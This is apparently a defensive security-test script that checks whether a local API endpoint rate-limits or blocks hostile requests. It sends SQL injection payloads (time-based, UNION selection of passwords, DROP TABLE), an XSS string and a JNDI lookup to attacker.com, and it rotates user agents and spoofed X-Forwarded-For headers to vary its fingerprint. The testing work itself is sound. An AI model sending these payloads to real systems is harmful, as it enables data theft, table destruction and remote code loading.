import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor
from uuid import uuid4

# Configurações
BASE_URL = "http://localhost:4567"
ENDPOINT = "/v1/extrato_convenio/publico/listagem"

# Payload padrão
PAYLOAD = {
    "ano": 2025,
    "tipo": "",
    "uorgOrigem": [],
    "numero": None,
    "periodo": []
}

# Lista de user agents para variar o fingerprint
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "PostmanRuntime/7.28.4",
    "curl/7.77.0",
    "python-requests/2.26.0"
]

# Lista de headers adicionais para variar
ADDITIONAL_HEADERS = [
    {"Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"},
    {"Accept-Language": "en-US,en;q=0.9"},
    {"Accept-Language": "es-ES,es;q=0.9"},
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Accept-Encoding": "identity"},
    {"Connection": "keep-alive"},
    {"Connection": "close"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Request-ID": str(uuid4())}
]

# Combinações de parâmetros maliciosos
MALICIOUS_PARAM_COMBINATIONS = [
    {"page": "0", "size": "15*if(now()=sysdate(),sleep(15),0)"},
    {"page": "0", "size": "15 AND 1=1"},
    {"page": "0", "size": "15; DROP TABLE usuarios;"},
    {"page": "0", "size": "15 UNION SELECT username, password FROM usuarios"},
    {"page": "0", "size": "15' OR '1'='1"},
    {"page": "0", "size": "<script>alert('XSS')</script>"},
    {"page": "${jndi:ldap://attacker.com/exploit}", "size": "15"},
    {"page": "0", "size": "' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"},
    {"page": "0", "size": "15; SELECT pg_sleep(15);--"},
    {"page": "0", "size": "15 AND (SELECT * FROM (SELECT(SLEEP(5)))--"},
    {"page": "0", "size": "15 AND (SELECT * FROM (SELECT BENCHMARK(10000000,MD5(NOW())))--"},
    {"page": "0", "size": "15 AND EXTRACTVALUE(1,CONCAT(0x5c,0x27,(SELECT MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50))))"},
    {"page": "0", "size": "15 AND (SELECT 1 FROM (SELECT SLEEP(5))A)"},
    {"page": "0", "size": "15 AND (SELECT 1 FROM (SELECT BENCHMARK(10000000,MD5(NOW())))"},
    {"page": "0", "size": "15 AND (SELECT 1 FROM (SELECT SLEEP(5))A WHERE 1=1)"}
]

def generate_random_headers():
    """Gera headers aleatórios para variar o fingerprint"""
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS)
    }
    
    # Adiciona alguns headers extras aleatoriamente
    for _ in range(random.randint(1, 3)):
        extra_header = random.choice(ADDITIONAL_HEADERS)
        headers.update(extra_header)
    
    return headers

def send_request(params, headers):
    try:
        url = f"{BASE_URL}{ENDPOINT}"
        response = requests.post(
            url,
            params=params,
            json=PAYLOAD,
            headers=headers,
            timeout=10
        )
        
        fingerprint = headers.get('X-Request-ID', 'N/A')
        print(f"Request {fingerprint} com parametros {params} - Status: {response.status_code}")
        if response.status_code == 429:
            print(f">>> RATE LIMITING DETECTADO for fingerprint {fingerprint}! <<<")
            return True, fingerprint
        return False, fingerprint
    except Exception as e:
        print(f"Error com parametros {params}: {str(e)}")
        return False, None

def test_with_varied_fingerprints():
    print("Iniciando test com variados fingerprints...")
    blocked_fingerprints = set()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for params in MALICIOUS_PARAM_COMBINATIONS:
            headers = generate_random_headers()
            futures.append(executor.submit(send_request, params, headers))
            time.sleep(0.2)  # Pequeno delay entre requisições
        
        for future in futures:
            was_blocked, fingerprint = future.result()
            if was_blocked and fingerprint:
                blocked_fingerprints.add(fingerprint)
    
    print(f"\nTotal fingerprints bloqueados: {len(blocked_fingerprints)}")
    if blocked_fingerprints:
        print("Fingerprints bloqueados:", blocked_fingerprints)
    
    return len(blocked_fingerprints) > 0

def test_parameter_combinations():
    print("\n Testando diferentes combinacoes de parametros...")
    test_cases = [
        # Testes com apenas um parâmetro malicioso
        {"page": "0", "size": "15*if(now()=sysdate(),sleep(15),0)"},
        {"page": "0' OR '1'='1", "size": "10"},
        {"page": "0", "size": "10' OR '1'='1"},
        
        # Testes com ambos parâmetros maliciosos
        {"page": "0' OR '1'='1", "size": "15*if(now()=sysdate(),sleep(15),0)"},
        
        # Testes com valores extremos
        {"page": "999999999999999999999999999999", "size": "999999999999999999999999999999"},
        {"page": "-1", "size": "-1"},
        
        # Testes com tipos inválidos
        {"page": "null", "size": "undefined"},
        {"page": "true", "size": "false"},
        
        # Testes com caracteres especiais
        {"page": "!@#$%^&*()", "size": "<>?:\"{}|"},
        
        # Testes com payloads muito longos
        {"page": "0", "size": "A"*10000},
        
        # Testes com encoding diferente
        {"page": "%27%20OR%201%3D1%3B--", "size": "15"},
        
        # Testes com múltiplos parâmetros
        {"page": "0", "size": "15", "extra": "malicious' OR '1'='1"}
    ]
    
    blocked_count = 0
    headers = generate_random_headers()
    
    for params in test_cases:
        was_blocked, _ = send_request(params, headers)
        if was_blocked:
            blocked_count += 1
        time.sleep(0.5)
    
    print(f"\Bloqueado: {blocked_count} out of {len(test_cases)} parameter combinations")
    return blocked_count > 0

if __name__ == "__main__":
    print("=== Iniciando Security Tests ===")
    
    # Teste 1: Variação de fingerprints
    print("\n=== TEST 1: Fingerprints Variados ===")
    fingerprint_test_result = test_with_varied_fingerprints()
    
    # Teste 2: Combinações de parâmetros
    print("\n=== TEST 2: Combinação de parâmetros ===")
    param_test_result = test_parameter_combinations()
    
    # Resumo dos testes
    print("\n=== TEST RESULTS ===")
    print(f"Fingerprint variação test: {'PASSED' if fingerprint_test_result else 'FAILED'}")
    print(f"Parametro combincao test: {'PASSED' if param_test_result else 'FAILED'}")
    
    if fingerprint_test_result and param_test_result:
        print("\nSUCCESS: Security funcionou conforme esperado!")
    else:
        print("\nWARNING: Alguma config de security tests não funcionou como esperado!")